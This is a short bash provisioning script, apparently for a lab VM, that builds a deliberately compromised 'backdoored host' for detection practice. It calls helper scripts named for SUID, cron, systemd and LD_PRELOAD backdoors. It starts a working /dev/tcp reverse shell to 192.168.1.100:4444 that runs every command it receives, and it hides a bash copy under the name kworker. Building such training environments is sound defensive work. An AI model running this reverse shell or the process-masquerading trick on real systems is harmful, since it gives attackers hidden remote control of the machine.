#!/bin/bash
# Backdoored Host Scenario - Provisioning Script
set -e
set -x

echo "================================================"
echo "  Backdoored Host - Vulnerability Provisioning"
echo "================================================"

SHARED=/vagrant/shared/vulnerabilities
apt-get update -qq
apt-get install -y -qq netcat-openbsd curl 2>/dev/null || true

bash "$SHARED/suid_backdoor.sh"
bash "$SHARED/cron_persistence.sh"
bash "$SHARED/systemd_trojan.sh"
bash "$SHARED/ld_preload_injection.sh"
bash "$SHARED/network_suspicious.sh"

# Start a reverse shell-like process for COM checks
nohup bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444;cat<&5|while read line;do $line 2>&5>&5;done' &>/dev/null &

# Suspicious process with misleading name
cp /bin/bash /tmp/kworker
/tmp/kworker -c "sleep 3600" &>/dev/null &

echo "================================================"
echo "  Backdoored host provisioning complete!"
echo "================================================"
